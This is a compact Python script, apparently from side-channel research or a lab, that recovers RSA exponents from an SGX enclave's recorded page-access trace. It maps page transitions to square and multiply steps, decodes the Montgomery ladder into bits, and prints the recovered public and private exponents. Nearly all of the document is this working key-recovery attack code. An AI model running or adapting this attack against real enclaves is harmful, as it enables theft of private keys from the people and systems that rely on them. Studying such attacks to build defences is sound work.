
"""
Minimal RSA Exponent Reconstruction Attack (Runner Version)
----------------------------------------------------------

This script provides a compact example of reconstructing RSA exponent bitstrings
from a VCD page-access trace using the AttackRunner class. It is designed for
brevity and quick reference, while maintaining the same logic and output format
as the more verbose clean version.

Workflow:
1. Loads a VCD trace file.
2. Identifies key pages: ANCHOR_PAGE, SQUARE_PAGE, MULTIPLY_PAGE, END_PAGE.
3. Uses AttackRunner to react to page transitions:
    - ANCHOR_PAGE → SQUARE_PAGE   → "A"
    - ANCHOR_PAGE → MULTIPLY_PAGE → "B"
    - END_PAGE triggers decoding and storage of the segment
4. Decodes the symbol sequence using the Montgomery ladder heuristic:
    - Leading "A"s are ignored
    - "B"  → bit "1"
    - "AA" → bit "0"
5. Collects and prints the recovered symbol sequences, bitstrings, and integer values.
    Prints the recovered public (e) and private (d) exponents if available.

This script is useful for quick demonstrations and for comparing with more detailed attack scripts.
"""

from __future__ import annotations

from sgxtrace import AttackRunner, load_vcd_trace

TRACE_PATH = "traces/trace_rsa.vcd"
ANCHOR_PAGE = "_17"
SQUARE_PAGE = "_20"
MULTIPLY_PAGE = "_22"
END_PAGE = "_31"


def decode_montgomery_ladder(symbols: str) -> tuple[str | None, int | None]:
    """Decode a symbol sequence into both bitstring and integer value."""
    tail = symbols.lstrip("A")
    bits: list[str] = []
    index = 0

    while index < len(tail):
        if tail[index] == "B":
            bits.append("1")
            index += 1
        elif tail[index : index + 2] == "AA":
            bits.append("0")
            index += 2
        else:
            index += 1

    bitstring = "".join(bits)
    return (bitstring, int(bitstring, 2)) if bitstring else (None, None)


def run_rsa_attack(trace_path: str = TRACE_PATH, *, verbose: bool = False) -> list[tuple[str, str, int]]:
    """Run the compact RSA reconstruction example."""
    trace = load_vcd_trace(trace_path)
    print(f"Loaded trace with {len(trace.times)} timestamps and {len(trace.access_history)} access events.")

    runner = AttackRunner(trace)
    runner.verbose = verbose
    runner.state["symbols"] = []
    runner.state["results"] = []

    def on_square(r: AttackRunner) -> None:
        r.state["symbols"].append("A")

    def on_multiply(r: AttackRunner) -> None:
        r.state["symbols"].append("B")

    def on_end(r: AttackRunner) -> None:
        symbols = "".join(r.state["symbols"])
        bitstring, value = decode_montgomery_ladder(symbols)
        if bitstring is not None and value is not None:
            r.state["results"].append((symbols, bitstring, value))
        r.state["symbols"] = []

    runner.on_transition(ANCHOR_PAGE, SQUARE_PAGE, on_square)
    runner.on_transition(ANCHOR_PAGE, MULTIPLY_PAGE, on_multiply)
    runner.on_page(END_PAGE, on_end)

    print("Running RSA attack...")
    runner.run()

    results: list[tuple[str, str, int]] = runner.state["results"]
    for index, (symbols, bits, value) in enumerate(results):
        print(f"[{index}] symbols={symbols} bits={bits} value={value}")

    if len(results) >= 2:
        print("\nRecovered RSA parameters:")
        print(f"  e = {results[0][2]}")
        print(f"  d = {results[1][2]}")

    return results


if __name__ == "__main__":
    run_rsa_attack()
